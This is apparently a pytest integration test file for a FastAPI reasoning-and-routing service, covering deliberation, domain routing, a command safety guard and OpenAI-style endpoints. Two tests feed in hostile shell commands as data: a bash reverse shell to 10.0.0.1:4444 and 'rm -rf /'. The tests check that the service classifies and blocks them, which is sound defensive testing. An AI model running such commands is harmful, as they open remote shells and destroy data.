import json
import httpx
import pytest
from fastapi.testclient import TestClient

from sys2.engine import System2Engine
from sys2.server import create_app


@pytest.fixture(scope="module")
def client():
    # Use CPU for deterministic and fast integration test execution
    engine = System2Engine(device="cpu")
    app = create_app(engine=engine, device="cpu")
    return TestClient(app)


# -----------------------------------------------------------------------------
# 1. System & Discovery Endpoints
# -----------------------------------------------------------------------------

def test_health_check(client):
    resp = client.get("/health")
    assert resp.status_code == 200
    data = resp.json()
    assert data["status"] == "healthy"
    assert data["non_autoregressive"] is True
    assert "available_domains" in data
    assert "science" in data["available_domains"]
    assert "physics" in data["available_domains"]
    assert "safety" in data["available_domains"]
    assert "eval" in data["available_domains"]
    assert "logic" in data["available_domains"]
    assert len(data["available_domains"]) == 13


def test_list_tracks(client):
    resp = client.get("/tracks")
    assert resp.status_code == 200
    data = resp.json()
    assert data["total_tracks"] == 13
    track_ids = [t["id"] for t in data["tracks"]]
    assert "science" in track_ids
    assert "code" in track_ids
    assert "med" in track_ids
    assert "electrical" in track_ids
    assert "auto" in track_ids
    assert "culinary" in track_ids
    assert "math" in track_ids
    assert "legal" in track_ids
    assert "finance" in track_ids
    assert "physics" in track_ids
    assert "safety" in track_ids
    assert "eval" in track_ids
    assert "logic" in track_ids


def test_list_models(client):
    resp = client.get("/v1/models")
    assert resp.status_code == 200
    data = resp.json()
    assert data["object"] == "list"
    model_ids = [m["id"] for m in data["data"]]
    assert "system2" in model_ids
    assert "system2-guard" in model_ids
    assert "system2:science" in model_ids
    assert "system2:physics" in model_ids
    assert "system2:safety" in model_ids


# -----------------------------------------------------------------------------
# 2. Native Deliberation & Routing Endpoints
# -----------------------------------------------------------------------------

def test_deliberate_basic(client):
    payload = {
        "question": "What is the primary function of chlorophyll in plant cells?",
        "choices": [
            "Absorbing light energy for photosynthesis",
            "Synthesizing lipid membranes",
            "Replicating cellular DNA",
            "Transporting sodium ions across the vacuole",
        ],
    }
    resp = client.post("/deliberate", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert "winning_choice" in data
    assert data["winning_index"] in (0, 1, 2, 3)
    assert data["letter"] in ("A", "B", "C", "D")
    assert 0.0 <= data["confidence"] <= 1.0
    assert len(data["probabilities"]) == 4
    assert sum(data["probabilities"]) == pytest.approx(1.0, abs=0.01)
    assert data["latency_ms"] > 0


def test_deliberate_with_domain_override(client):
    payload = {
        "question": "Under contract law, what element creates mutual assent?",
        "choices": [
            "Offer and acceptance",
            "Unilateral expectation",
            "Past consideration",
            "Promissory estoppel",
        ],
        "domain": "legal",
    }
    resp = client.post("/deliberate", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert data["domain"] == "legal"
    assert data["winning_choice"] in payload["choices"]
    assert 0 <= data["winning_index"] < len(payload["choices"])
    assert data["letter"] in ("A", "B", "C", "D")


def test_deliberate_two_choices(client):
    payload = {
        "question": "Is water a polar molecule?",
        "choices": [
            "Yes, water is a polar molecule with a dipole moment",
            "No, water is nonpolar and symmetric",
        ],
    }
    resp = client.post("/deliberate", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert data["winning_index"] in (0, 1)
    assert data["winning_choice"] == "Yes, water is a polar molecule with a dipole moment"


def test_deliberate_invalid_choices(client):
    payload = {
        "question": "Invalid query",
        "choices": ["Single choice only"],
    }
    resp = client.post("/deliberate", json=payload)
    assert resp.status_code == 422 or resp.status_code == 400


def test_route_lexical_code(client):
    resp = client.post("/route", json={"prompt": "```python\ndef mutate(val, arr=[]):\n    arr.append(val)\n```"})
    assert resp.status_code == 200
    data = resp.json()
    assert data["selected_track"] == "code"
    assert data["method"] == "lexical"
    assert data["confidence"] >= 0.88


def test_route_lexical_safety(client):
    resp = client.post("/route", json={"prompt": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})
    assert resp.status_code == 200
    data = resp.json()
    assert data["selected_track"] == "safety"
    assert data["method"] == "lexical"
    assert data["confidence"] >= 0.88


def test_route_lexical_auto(client):
    resp = client.post("/route", json={"prompt": "A vehicle triggers DTC code P0300 with active misfire counts."})
    assert resp.status_code == 200
    data = resp.json()
    assert data["selected_track"] == "auto"
    assert data["method"] == "lexical"


# -----------------------------------------------------------------------------
# 3. Safety Gatekeeper Endpoint
# -----------------------------------------------------------------------------

def test_guard_benign_allowed(client):
    resp = client.post("/guard", json={"command": "ls -la /home"})
    assert resp.status_code == 200
    data = resp.json()
    assert data["command"] == "ls -la /home"
    assert data["verdict"] == "ALLOWED"
    assert data["category"] == "safe"
    assert data["confidence"] >= 0.70


def test_guard_destructive_blocked(client):
    resp = client.post("/guard", json={"command": "rm -rf /"})
    assert resp.status_code == 200
    data = resp.json()
    assert data["command"] == "rm -rf /"
    assert data["verdict"] == "BLOCKED"
    assert data["category"] in ("destructive", "adversarial")
    assert data["confidence"] >= 0.70


def test_guard_custom_thresholds(client):
    resp = client.post("/guard", json={
        "command": "reboot",
        "allow_threshold": 0.95,
        "block_threshold": 0.95,
        "abstain_threshold": 0.90,
    })
    assert resp.status_code == 200
    data = resp.json()
    assert data["verdict"] == "ABSTAIN"


# -----------------------------------------------------------------------------
# 4. Backward Compatibility: Jev & OpenAI Specifications
# -----------------------------------------------------------------------------

def test_systemone_choice_question(client):
    payload = {
        "model": "system2",
        "state": "Water at 20 degrees Celsius at 1 atmosphere of pressure.",
        "questions": {
            "state_of_matter": {
                "type": "choice",
                "instructions": "What is the physical state of matter?",
                "criteria": {
                    "opt_liquid": "Liquid state with fluid volume",
                    "opt_solid": "Solid crystalline ice",
                },
            }
        },
    }
    resp = client.post("/v1/systemone", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert "state_of_matter" in data["answers"]
    ans = data["answers"]["state_of_matter"]
    assert ans["type"] == "choice"
    assert ans["choice"] == "opt_liquid"
    assert ans["confidence"] > 0.0
    assert data["usage"]["output_tokens"] == 0


def test_systemone_noul_and_bool_questions(client):
    payload = {
        "model": "system2",
        "state": "The system temperature is 20 degrees Celsius.",
        "questions": {
            "is_liquid": {
                "type": "noul",
                "instructions": "Is water liquid at this temperature?",
                "criteria": {
                    "true": "Water is in the liquid phase",
                    "false": "Water is frozen solid",
                },
            },
            "is_liquid_bool": {
                "type": "bool",
                "instructions": "Is water liquid at this temperature?",
                "criteria": {
                    "true": "Water is in the liquid phase",
                    "false": "Water is frozen solid",
                },
            },
        },
    }
    resp = client.post("/v1/systemone", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert data["answers"]["is_liquid"]["noul"] > 0.5
    assert data["answers"]["is_liquid_bool"]["bool"] is True


def test_systemone_score_question(client):
    payload = {
        "model": "system2",
        "state": "Water at 20 degrees Celsius.",
        "questions": {
            "temperature_level": {
                "type": "score",
                "instructions": "Classify the phase level of water.",
                "criteria": [
                    "Solid frozen ice",
                    "Liquid water",
                    "Superheated gas plasma",
                ],
            }
        },
    }
    resp = client.post("/v1/systemone", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert "temperature_level" in data["answers"]
    assert data["answers"]["temperature_level"]["type"] == "score"
    assert 0.0 <= data["answers"]["temperature_level"]["score"] <= 2.0


def test_decisions_openai_specification(client):
    payload = {
        "model": "system2:science",
        "input": "Chlorophyll in plant leaves under full solar radiation.",
        "questions": [
            {
                "type": "predicate",
                "name": "reflects_green",
                "instructions": "Chlorophyll reflects green light wavelengths while absorbing red and blue.",
            },
            {
                "type": "choice",
                "name": "leaf_color",
                "instructions": "What color do leaves predominantly appear to human vision?",
                "choices": [
                    {"value": "green", "description": "Green hue"},
                    {"value": "purple", "description": "Deep violet purple"},
                ],
            },
        ],
    }
    resp = client.post("/v1/decisions", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert len(data["answers"]) == 2
    assert data["answers"][0]["predicate"] is True
    assert data["answers"][1]["choice"] == "green"


@pytest.mark.asyncio
async def test_reverse_proxy_chat_completions(monkeypatch):
    engine = System2Engine(device="cpu")
    app = create_app(engine=engine, device="cpu", upstream_llm="http://upstream-llm:1234")

    async def mock_send(self, request, **kwargs):
        content = json.dumps({
            "id": "chatcmpl-mock",
            "choices": [{"message": {"role": "assistant", "content": "Generative answer from upstream."}}],
        }).encode("utf-8")
        return httpx.Response(200, content=content, headers={"content-type": "application/json"})

    monkeypatch.setattr(httpx.AsyncClient, "send", mock_send)

    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as ac:
        resp = await ac.post("/v1/chat/completions", json={"messages": [{"role": "user", "content": "hi"}]})
        assert resp.status_code == 200
        data = resp.json()
        assert data["choices"][0]["message"]["content"] == "Generative answer from upstream."
